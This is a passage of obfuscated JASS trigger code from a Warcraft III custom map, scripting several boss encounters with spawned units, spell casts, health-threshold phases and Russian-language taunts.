call CreateNUnitsAtLoc(GetRandomInt(2,7),$6E303249,Player(10),GetRandomLocInRect(DP),bj_UNIT_FACING)
call SetUnitOwner(Ll,Player(11),true)
call SetUnitInvulnerable(GetTriggerUnit(),false)
endfunction
function Bmv takes nothing returns nothing
set fb=CreateTrigger()
call TriggerRegisterEnterRectSimple(fb,DQ)
call TriggerAddCondition(fb,Condition(function Bmt))
call TriggerAddAction(fb,function Bmu)
endfunction
function Bmw takes nothing returns nothing
call IssueTargetOrderBJ(GetEnumUnit(),"fingerofdeath",Ll)
endfunction
function Bmx takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"move",GetRectCenter(DQ))
endfunction
function Bmy takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bmz takes nothing returns nothing
local location Mc
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30.)
if Bmy() then
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(DQ))
call SetUnitOwner(Ll,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
set Mc=PolarProjectionBJ(GetRectCenter(DQ),800.,GetRandomDirectionDeg())
call CreateNUnitsAtLoc(1,$68303256,Player(10),Mc,bj_UNIT_FACING)
call RemoveLocation(Mc)
set SR=GetUnitsOfTypeIdAll($68303256)
call ForGroupBJ(SR,function Bmw)
call DestroyGroup(SR)
call TriggerSleepAction(1.)
set SR=GetUnitsOfTypeIdAll($68303256)
call ForGroupBJ(SR,function Bmx)
call DestroyGroup(SR)
call TriggerSleepAction(10.)
call SetUnitOwner(Ll,Player(11),true)
call SetUnitInvulnerable(GetTriggerUnit(),false)
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
set Mc=null
endfunction
function Bm0 takes nothing returns nothing
set fc=CreateTrigger()
call TriggerRegisterUnitEvent(fc,Ll,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fc,function Bmz)
endfunction
function Bm1 takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"starfall")
endfunction
function Bm2 takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bm3 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
if Bm2() then
call CreateUnitAtLoc(Player(10),$68303255,GetRandomLocInRect(DP),270.)
set SR=GetUnitsOfTypeIdAll($68303255)
call ForGroupBJ(SR,function Bm1)
call DestroyGroup(SR)
call GroupClear(SR)
call DestroyGroup(SR)
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bm4 takes nothing returns nothing
set fd=CreateTrigger()
call TriggerRegisterUnitEvent(fd,Ll,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fd,function Bm3)
endfunction
function Bm5 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bm6 takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),YV[222])
endfunction
function Bm7 takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bm8 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
if Bm7() then
set YV[222]=GetRandomLocInRect(DP)
call AddSpecialEffectLocBJ(YV[222],"Abilities\\Spells\\Other\\Doom\\DoomDeath.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(2)
call SetUnitPositionLoc(Ll,YV[222])
call TriggerSleepAction(.5)
set SR=GetUnitsInRectMatching(DP,Condition(function Bm5))
call ForGroupBJ(SR,function Bm6)
call GroupClear(SR)
call DestroyGroup(SR)
call RemoveLocation(YV[222])
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
else
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bm9 takes nothing returns nothing
set fe=CreateTrigger()
call TriggerRegisterUnitEvent(fe,Ll,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fe,function Bm8)
endfunction
function BnB takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D46) then
return false
endif
return true
endfunction
function BnC takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetSpellTargetUnit()))+" "+"познает мой гнев!")
endfunction
function BnD takes nothing returns nothing
set ff=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ff,EVENT_PLAYER_UNIT_SPELL_CHANNEL)
call TriggerAddCondition(ff,Condition(function BnB))
call TriggerAddAction(ff,function BnC)
endfunction
function BnE takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local location Ht=Location(-9920,-21100)
local integer L9=LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)
local location Nk=nU(Ht,LoadInteger(PP,GetHandleId(GetExpiredTimer()),2),L9)
local group Mc
local boolexpr No
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
call SetUnitPositionLoc(Hu,Nk)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\EnergyBurst.mdl",Nk))
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRangeOfLoc(Mc,Nk,300,No)
call DestroyBoolExpr(No)
set Nu=25000
set Pq=LW
call ForGroup(Mc,function nB)
call DestroyGroup(Mc)
set Mc=null
set No=null
else
call RemoveUnit(Hu)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
endif
set Hu=null
call RemoveLocation(Ht)
set Ht=null
call RemoveLocation(Nk)
set Nk=null
endfunction
function BnF takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit VB=LW
local location Ht=GetUnitLoc(VB)
local location Nk=GetUnitLoc(Hu)
call IssueTargetOrder(Hu,"smart",VB)
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
if DistanceBetweenPoints(Ht,Nk)<=150 then
call SetUnitLifePercentBJ(VB,100)
set fg[1]=80
set fg[2]=70
call RemoveUnit(Hu)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
endif
else
call RemoveUnit(Hu)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
endif
set Hu=null
set VB=null
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
endfunction
function BnG takes nothing returns nothing
local unit Hu
local location Mc
local timer No
if GetUnitAbilityLevel(LW,$4131394B)>=1 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30)
set Mc=Location(-9920,-21100)
set Hu=CreateUnitAtLoc(Player(11),$6E303843,Mc,0)
call SetUnitVertexColor(Hu,255,0,255,255)
set No=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(No),0,Hu)
call SaveInteger(PP,GetHandleId(No),1,360)
call SaveInteger(PP,GetHandleId(No),2,GetRandomInt(200,400))
call TimerStart(No,.04,true,function BnE)
call EnableTrigger(GetTriggeringTrigger())
call RemoveLocation(Mc)
set Mc=null
set No=null
endif
set Hu=null
endfunction
function BnH takes nothing returns nothing
local location Ht
local unit Hu
local integer Mc
local timer No
if GetUnitLifePercent(LW)<=I2R(fg[2]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(LW,I2R(fg[2]))
call nh(LW,"А вот и помощь!!",.028,50,50,255)
set fg[2]=fg[2]-30
set Mc=GetRandomInt(1,4)
if Mc==1 then
set Ht=Location(-10600,-20250)
elseif Mc==2 then
set Ht=Location(-9200,-20250)
elseif Mc==3 then
set Ht=Location(-10400,-21740)
elseif Mc==4 then
set Ht=Location(-9330,-21680)
endif
set Hu=CreateUnit(Player(10),$6E303843,GetLocationX(Ht),GetLocationY(Ht),0)
set No=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(No),0,Hu)
call SaveInteger(PP,GetHandleId(No),1,45)
call TimerStart(No,.3,true,function BnF)
call EnableTrigger(GetTriggeringTrigger())
set No=null
endif
set Hu=null
call RemoveLocation(Ht)
set Ht=null
endfunction
function BnI takes nothing returns nothing
local unit NR
local location Ht
local unit Hu
local group Mc
local boolexpr No
local integer Np
if GetUnitLifePercent(LW)<=I2R(fg[1]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(LW,I2R(fg[1]))
set fg[1]=fg[1]-7
if GetUnitState(LW,UNIT_STATE_LIFE)>.405 then
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Rect(-10690,-22120,-9020,-19970),No)
call DestroyBoolExpr(No)
set NR=GroupPickRandomUnit(Mc)
set Ht=GetUnitLoc(NR)
set Hu=CreateUnit(Player(10),$68303239,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
set NR=GroupPickRandomUnit(Mc)
set Ht=GetUnitLoc(NR)
set Hu=CreateUnit(Player(10),$68303241,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
set NR=GroupPickRandomUnit(Mc)
set Ht=GetUnitLoc(NR)
set Hu=CreateUnit(Player(10),$68303238,GetLocationX(Ht),GetLocationY(Ht),0)
call RemoveLocation(Ht)
call DestroyGroup(Mc)
set Mc=null
set No=null
set Mc=CreateGroup()
set No=Condition(function mx)
call GroupEnumUnitsInRect(Mc,Rect(-10690,-22120,-9020,-19970),No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
if Np>10 then
call SetUnitLifePercentBJ(LW,100)
set fg[1]=90
set fg[2]=70
call nh(LW,"ООО, ну вот вы и доигрались!",.028,255,0,255)
call SetUnitVertexColor(LW,255,0,255,255)
call UnitAddAbility(LW,$4131394B)
call UnitAddAbility(LW,$4131345A)
call UnitAddAbility(LW,$41305655)
call SetUnitAbilityLevel(LW,$4131394B,10)
endif
call DestroyGroup(Mc)
set Mc=null
endif
endif
call EnableTrigger(GetTriggeringTrigger())
set NR=null
set Hu=null
call RemoveLocation(Ht)
set Ht=null
endfunction
function BnJ takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LW,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnI)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LW,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnH)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LW,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnG)
set Hc=null
endfunction
function BnK takes nothing returns boolean
if not (GetUnitLifePercent(LU)<=50.) then
return false
endif
return true
endfunction
function BnL takes nothing returns nothing
if BnK() then
call DisableTrigger(GetTriggeringTrigger())
call ShowUnitHide(LU)
call PauseUnit(LU,true)
call CreateNUnitsAtLoc(1,$68303230,Player(11),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$6830315A,Player(11),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$68303232,Player(11),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$68303231,Player(11),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
else
endif
endfunction
function BnM takes nothing returns nothing
set fh=CreateTrigger()
call TriggerRegisterUnitEvent(fh,LU,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fh,function BnL)
endfunction
function BnN takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303231) then
return false
endif
return true
endfunction
function BnO takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303230) then
return false
endif
return true
endfunction
function BnP takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830315A) then
return false
endif
return true
endfunction
function BnQ takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303232) then
return false
endif
return true
endfunction
function BnR takes nothing returns boolean
if not (SP==4) then
return false
endif
return true
endfunction
function BnS takes nothing returns nothing
if BnN() then
set SP=SP+1
else
endif
if BnO() then
set SP=SP+1
else
endif
if BnP() then
set SP=SP+1
else
endif
if BnQ() then
set SP=SP+1
else
endif
if BnR() then
call ShowUnitShow(LU)
call PauseUnit(LU,false)
set SP=0
else
endif
endfunction
function BnT takes nothing returns nothing
set fi=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fi,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(fi,function BnS)
endfunction
function BnU takes nothing returns nothing
local unit VB=LoadUnitHandle(fj,GetHandleId(GetExpiredTimer()),0)
local unit Hu=LoadUnitHandle(fj,GetHandleId(GetExpiredTimer()),1)
local location fk=GetUnitLoc(VB)
local location Nk=GetUnitLoc(Hu)
if GetUnitState(Hu,UNIT_STATE_LIFE)>0 then
call IssuePointOrderLoc(Hu,"smart",fk)
else
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
if DistanceBetweenPoints(fk,Nk)<=100 then
call nh(Hu,"Уничтожу!",.028,255,0,0)
call DestroyEffect(AddSpecialEffectLoc("Units\\NightElf\\Wisp\\WispExplode.mdl",Nk))
if d8[1]==3 then
call UnitAddAbility(VB,$4131394B)
else
call UnitAddAbility(VB,$4131394A)
endif
call SetUnitAbilityLevel(VB,$4131394B,GetUnitAbilityLevel(VB,$4131394B)+1)
call SetUnitAbilityLevel(VB,$4131394A,GetUnitAbilityLevel(VB,$4131394A)+1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call KillUnit(Hu)
call RemoveUnit(Hu)
endif
call RemoveLocation(fk)
call RemoveLocation(Nk)
set fk=null
set Nk=null
set Hu=null
set VB=null
endfunction
function BnV takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht=GetUnitLoc(Hu)
local location Nk
local integer L9=GetRandomInt(1,4)
local unit Nv
local unit Mc
local timer Hc
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(8.)
call nh(Hu,"Иди сюда!",.028,0,255,255)
if L9==1 then
set Nk=Location(684,-23033)
elseif L9==2 then
set Nk=Location(2006,-23033)
elseif L9==3 then
set Nk=Location(2006,-24282)
elseif L9==4 then
set Nk=Location(684,-24282)
endif
set Nv=CreateUnitAtLoc(Player(10),$6E303131,Nk,0)
if d8[1]==3 then
call UnitAddAbility(Nv,$4130384C)
set Mc=CreateUnitAtLoc(Player(10),$6530304A,Ht,0)
set Mc=null
endif
set Hc=CreateTimer()
call SaveUnitHandle(fj,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(fj,GetHandleId(Hc),1,Nv)
call TimerStart(Hc,.5,true,function BnU)
set Hc=null
set Hu=null
set Nv=null
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BnW takes nothing returns nothing
local location Mc
local unit No
if GetUnitLifePercent(K1)<=I2R(TK[1]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TK[1]))
set Mc=GetRandomLocInRect(Gd)
set No=CreateUnitAtLoc(Player(10),$6E303132,Mc,0)
call UnitApplyTimedLife(No,$42544C46,5)
if d8[1]==3 then
call SetUnitAbilityLevel(No,$41303057,2)
endif
call IssuePointOrderLoc(No,"rainoffire",Mc)
set TK[1]=TK[1]-10
set No=null
call RemoveLocation(Mc)
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BnX takes nothing returns nothing
local location Mc
local unit No
if d8[1]==3 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
if GetOwningPlayer(GetTriggerUnit())==Player(11) and GetUnitState(GetTriggerUnit(),UNIT_STATE_LIFE)>=.405 then
set Mc=GetRandomLocInRect(Gd)
set No=CreateUnitAtLoc(Player(10),$68303148,Mc,bj_UNIT_FACING)
call IssuePointOrderLoc(No,"flamestrike",Mc)
call nD(No,5)
call RemoveLocation(Mc)
set Mc=null
set No=null
call TriggerSleepAction(5.)
call EnableTrigger(GetTriggeringTrigger())
endif
endif
endfunction
function BnY takes nothing returns nothing
local group Mc
local boolexpr No
local unit Np
local location Nt
local unit Ny
local boolean Ot
if d8[1]==3 then
if GetUnitLifePercent(GetTriggerUnit())<=I2R(TK[2]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TK[2]))
set TK[2]=TK[2]-10
if GetUnitAbilityLevel(GetTriggerUnit(),$41436D33)>=1 then
call SetUnitVertexColor(K1,255,0,0,100)
call nh(K1,"|c00ff0000Я физичесий ублюдок!",.028,255,255,255)
call UnitAddAbility(K1,$41313753)
call UnitRemoveAbility(K1,$41436D33)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Gd,No)
set Ot=false
loop
exitwhen not not Ot
set Np=FirstOfGroup(Mc)
if Np==null then
set Ot=true
else
set Nt=GetUnitLoc(Np)
set Ny=CreateUnitAtLoc(Player(10),$6530304A,Nt,0)
call SetUnitVertexColor(Ny,255,0,0,100)
call UnitAddAbility(Ny,$41313753)
set Ny=null
call RemoveLocation(Nt)
set Nt=null
call GroupRemoveUnit(Mc,Np)
endif
endloop
call DestroyGroup(Mc)
call DestroyBoolExpr(No)
set Mc=null
set No=null
else
call SetUnitVertexColor(K1,0,0,255,100)
call nh(K1,"|c000000ffЯ магический ублюдок!",.028,255,255,255)
call UnitAddAbility(K1,$41436D33)
call UnitRemoveAbility(K1,$41313753)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Gd,No)
set Ot=false
loop
exitwhen not not Ot
set Np=FirstOfGroup(Mc)
if Np==null then
set Ot=true
else
set Nt=GetUnitLoc(Np)
set Ny=CreateUnitAtLoc(Player(10),$6530304A,Nt,0)
call SetUnitVertexColor(Ny,0,0,255,100)
call UnitAddAbility(Ny,$41436D33)
set Ny=null
call RemoveLocation(Nt)
set Nt=null
call GroupRemoveUnit(Mc,Np)
endif
endloop
call DestroyGroup(Mc)
call DestroyBoolExpr(No)
set Mc=null
set No=null
endif
call EnableTrigger(GetTriggeringTrigger())
else
endif
endif
set Np=null
endfunction
function BnZ takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnV)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnW)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnX)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BnY)
set Hc=null
endfunction
function Bna takes nothing returns nothing
local location Ht
local unit NQ
call DisableTrigger(GetTriggeringTrigger())
set Ht=GetRandomLocInRect(a)
set NQ=CreateUnitAtLoc(Player(10),$6E303050,Ht,bj_UNIT_FACING)
call nD(NQ,60)
call RemoveLocation(Ht)
set Ht=null
set NQ=null
call TriggerSleepAction(15.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bnb takes nothing returns nothing
local location Mc
local unit No
if GetUnitLifePercent(GetTriggerUnit())<=I2R(TL[0]) and GetUnitState(GetTriggerUnit(),UNIT_STATE_LIFE)>=.405 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TL[0]))
set TL[0]=TL[0]-15
set Mc=GetRandomLocInRect(a)
set No=CreateUnitAtLoc(Player(10),$7530304D,Mc,bj_UNIT_FACING)
call nD(No,35)
if d8[2]==3 then
call SetUnitAbilityLevel(No,$41556464,2)
endif
call IssuePointOrderLoc(No,"deathanddecay",Mc)
call RemoveLocation(Mc)
set Mc=null
set No=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bnc takes nothing returns nothing
local location Ht
local unit NQ
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(GetTriggeringTrigger())
set Ht=Location(3500,-21700)
call nh(Kv,"|c00ff00ffСкрррр..",.028,255,255,255)
set NQ=CreateUnitAtLoc(Player(10),$6E303049,Ht,bj_UNIT_FACING)
if d8[2]==3 then
call nk(NQ,20000)
call nl(NQ,150)
call UnitAddAbility(NQ,$41304E45)
endif
call IssueTargetOrder(NQ,"smart",Kv)
call RemoveLocation(Ht)
set Ht=null
set NQ=null
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bnd takes nothing returns nothing
local location Mc
if GetUnitTypeId(GetTriggerUnit())==$6E303050 then
set Mc=GetUnitLoc(GetTriggerUnit())
if d8[2]==1 then
call CreateUnitAtLoc(Player(10),$6E303046,Mc,bj_UNIT_FACING)
call CreateUnitAtLoc(Player(10),$6E303045,Mc,bj_UNIT_FACING)
elseif d8[2]==2 then
call CreateUnitAtLoc(Player(10),$6E303046,Mc,bj_UNIT_FACING)
call CreateUnitAtLoc(Player(10),$6E303045,Mc,bj_UNIT_FACING)
call CreateUnitAtLoc(Player(10),$6E303044,Mc,bj_UNIT_FACING)
elseif d8[2]==3 then
call CreateUnitAtLoc(Player(10),$7530304F,Mc,bj_UNIT_FACING)
call CreateUnitAtLoc(Player(10),$7530304F,Mc,bj_UNIT_FACING)
call CreateUnitAtLoc(Player(10),$7530304F,Mc,bj_UNIT_FACING)
endif
call RemoveLocation(Mc)
set Mc=null
endif
endfunction
function Bne takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),0),$4130434E)
call DestroyEffect(LoadEffectHandle(fl,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function Bnf takes nothing returns nothing
local effect Mc
local timer No
if d8[2]==3 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30)
call UnitAddAbility(GetTriggerUnit(),$4130434E)
set Mc=AddSpecialEffectTarget("war3mapImported\\BlessedField.mdx",GetTriggerUnit(),"origin")
set No=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(No),0,GetTriggerUnit())
call SaveEffectHandle(fl,GetHandleId(No),1,Mc)
call TimerStart(No,8,false,function Bne)
set No=null
call EnableTrigger(GetTriggeringTrigger())
endif
set Mc=null
endfunction
function Bng takes nothing returns nothing
if d8[2]==3 then
if GetUnitTypeId(GetAttacker())==$6E30304F and GetUnitAbilityLevel(GetAttacker(),$4130434E)>=1 and GetUnitState(Kv,UNIT_STATE_LIFE)>.405 then
call mz(GetAttacker(),GetTriggerUnit(),15000)
endif
endif
endfunction
function Bnh takes nothing returns nothing
local group Mc
local boolexpr No
local unit Np
local effect Nt
local location Ny
if d8[2]==3 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,J,No)
set Np=GroupPickRandomUnit(Mc)
set Nt=AddSpecialEffectTarget("war3mapImported\\BlightwalkerAura.mdl",Np,"origin")
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Nature.mdl",Np,"origin"))
call SetUnitInvulnerable(Np,true)
call DestroyGroup(Mc)
call DestroyBoolExpr(No)
set Mc=null
set No=null
call TriggerSleepAction(3)
set Ny=GetUnitLoc(Np)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Stormfall Nature.mdl",Ny))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Stormfall Red.mdl",Ny))
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRangeOfLoc(Mc,Ny,600,No)
set Nu=80000
call ForGroup(Mc,function nB)
call DestroyEffect(Nt)
call SetUnitInvulnerable(Np,false)
call DestroyGroup(Mc)
call DestroyBoolExpr(No)
set Mc=null
set No=null
call RemoveLocation(Ny)
set Ny=null
set Nt=null
set Np=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function Bni takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kv,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bna)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kv,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bnb)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kv,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bnc)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Hc,function Bnd)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kv,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bnf)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(Hc,function Bng)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kv,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bnh)
set Hc=null
endfunction
function Bnj takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location Ht=GetUnitLoc(VB)
local unit Mc
local unit No
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if IsUnitAliveBJ(VB)==true then
if GetOwningPlayer(VB)==Player(11) then
set Mc=CreateUnitAtLoc(Player(10),$6E303054,Ht,0)
call UnitApplyTimedLife(Mc,$42544C46,50)
set No=CreateUnitAtLoc(Player(10),$6E303053,Ht,0)
call UnitApplyTimedLife(No,$42544C46,50)
if d8[3]==3 then
call UnitAddAbility(Mc,$4130414B)
call UnitAddAbility(Mc,$41304456)
call UnitAddAbility(No,$4130414B)
call UnitAddAbility(No,$41304456)
endif
set Mc=null
set No=null
endif
endif
set VB=null
call RemoveLocation(Ht)
set Ht=null
call TriggerSleepAction(25.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bnk takes nothing returns nothing
local trigger fm=CreateTrigger()
call TriggerRegisterUnitEvent(fm,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fm,function Bnj)
set fm=null
endfunction
function Bnl takes nothing returns nothing
local unit Hu=GetEnumUnit()
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,20)*.01)
set Hu=null
endfunction
function Bnm takes nothing returns nothing
local unit Hu=GetEnumUnit()
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*RMaxBJ(0,50)*.01)
set Hu=null
endfunction
function Bnn takes nothing returns nothing
local unit VB=GetTriggerUnit()
local group Mc
local boolexpr No
local unit Np
local unit Nt
local effect Ny
local real Ot
local real Ou
local real Ov
local group Ow
local boolexpr Ox
if GetUnitLifePercent(VB)<=I2R(fo[1]) then
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(fo[1]))
set fo[1]=fo[1]-17
call DisableTrigger(GetTriggeringTrigger())
if IsUnitAliveBJ(VB)==true then
if GetOwningPlayer(VB)==Player(11) then
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Rect(5712,-24222,7070,-23000),No)
call DestroyBoolExpr(No)
set Np=GroupPickRandomUnit(Mc)
set Nt=CreateUnitAtLoc(Player(11),$68303739,GetUnitLoc(Np),0)
call nD(Nt,1)
call UnitAddAbility(Nt,$4131324E)
call UnitApplyTimedLife(Nt,$42544C46,1)
call IssueTargetOrder(Nt,"creepthunderbolt",Np)
set Nt=null
call PauseUnit(Np,true)
set Ny=AddSpecialEffectTarget("war3mapImported\\Chain Prison.mdx",Np,"origin")
call DestroyGroup(Mc)
set No=null
set Mc=null
call TriggerSleepAction(4.)
set Ot=GetUnitX(Np)
set Ou=GetUnitY(Np)
set Ov=300.
set Ow=CreateGroup()
set Ox=Condition(function mv)
call GroupEnumUnitsInRange(Ow,Ot,Ou,Ov,Ox)
call DestroyBoolExpr(Ox)
call DestroyEffect(Ny)
call PauseUnit(Np,false)
if CountUnitsInGroup(Ow)==1 then
call KillUnit(Np)
elseif CountUnitsInGroup(Ow)>1 and CountUnitsInGroup(Mc)<3 then
call ForGroup(Mc,function Bnl)
elseif CountUnitsInGroup(Ow)>3 and CountUnitsInGroup(Mc)<5 then
call ForGroup(Mc,function Bnm)
endif
call DestroyGroup(Ow)
set Ox=null
set Ow=null
endif
